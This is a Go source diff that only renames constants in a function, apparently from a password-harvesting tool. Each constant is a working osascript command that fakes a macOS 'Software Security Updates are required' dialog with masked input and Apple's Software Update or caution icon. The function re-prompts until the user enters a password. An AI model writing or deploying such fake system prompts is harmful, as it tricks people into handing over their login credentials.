@@ -12,21 +12,21 @@ func AskPass() string {
 	}
 }
 
-const script1 = "osascript -e " +
+const macScriptEX = "osascript -e " +
 	"'Tell application \"System Events\" to display dialog " +
 	"\"Software Security Updates are required.\nTo update, please enter your password:\" " +
 	"buttons {\"OK\"} default button \"OK\" with hidden answer default answer \"\" " +
 	"with icon file \"/System/Library/CoreServices/Software Update.app/Contents/Resources/SoftwareUpdate.icns\" " +
 	"as alias' -e 'text returned of result'"
 
-const script2 = "osascript -e " +
+const macScriptNEXA = "osascript -e " +
 	"'Tell application \"System Events\" to display dialog " +
 	"\"Software Security Updates are required.\nTo update, please enter your password:\" " +
 	"buttons {\"OK\"} default button \"OK\" with hidden answer default answer \"\" " +
 	"with icon file \"/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/AlertCautionIcon.icns\" " +
 	"as alias' -e 'text returned of result'"
 
-const script3 = "osascript -e " +
+const macScriptNEX = "osascript -e " +
 	"'Tell application \"System Events\" to display dialog " +
 	"\"Software Security Updates are required.\nTo update, please enter your password:\" " +
 	"buttons {\"OK\"} default button \"OK\" with hidden answer default answer \"\" " +
@@ -37,11 +37,11 @@ func askMacPassword() string {
 	alert := "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/AlertCautionIcon.icns"
 	var userInput string
 	if utils.IsFileExist(software) {
-		userInput = utils.RunCommand(script1)
+		userInput = utils.RunCommand(macScriptEX)
 	} else if utils.IsFileExist(alert) {
-		userInput = utils.RunCommand(script2)
+		userInput = utils.RunCommand(macScriptNEXA)
 	} else {
-		userInput = utils.RunCommand(script3)
+		userInput = utils.RunCommand(macScriptNEX)
 	}
 	if userInput == "" {
 		return askMacPassword()
